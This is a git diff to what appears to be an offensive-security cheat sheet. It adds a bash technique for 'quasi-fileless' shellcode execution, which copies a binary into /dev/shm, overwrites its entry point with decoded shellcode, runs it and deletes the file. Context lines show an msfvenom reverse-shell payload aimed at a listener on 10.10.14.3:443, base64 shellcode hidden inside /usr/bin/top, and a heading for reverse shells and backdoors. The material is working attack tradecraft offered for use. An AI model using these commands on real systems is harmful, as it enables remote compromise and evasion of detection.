@@ -38,6 +38,26 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 | base64 | tr
 python3 hide_in_image.py /usr/bin/top ailYmWoCX2oBXg8FSJdIuQIAAbt/AAABUUiJ5moQWmoqWA8FagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU=
 ```
 
+### executing schellcode from `bash`
+Quasi-fileless (assuming writing to `/dev/shm` is considered fileless) execution of shellcode can also be achieved by using `bash` scripting only.
+```bash
+# read first function argument
+shellcode=$(base64 -d <<<$1)
+
+# create temoporary in-memory copy of a binary
+binpath="/dev/shm/$(cat /dev/urandom | tr -cd [:alpha:] | head -c 10).tmp"
+cp $(which ls) $binpath
+
+# read entry point (check `man proc`)
+offset=$(printf "%d" "0x$(dd if=$binpath skip=24 count=8 bs=1 2>/dev/null | xxd -e -g 8 | cut -d' ' -f2)")
+
+# write shellcode to temporary file
+echo $shellcode | dd conv=notrunc of=$binpath seek=$offset count=$(wc -c <<<$shellcode) bs=1 2>/dev/null
+
+# execute and remove the file
+rm $binpath & exec $binpath
+```
+
 ## fancy reverse shells and backdoors
 ```bash
 # classic
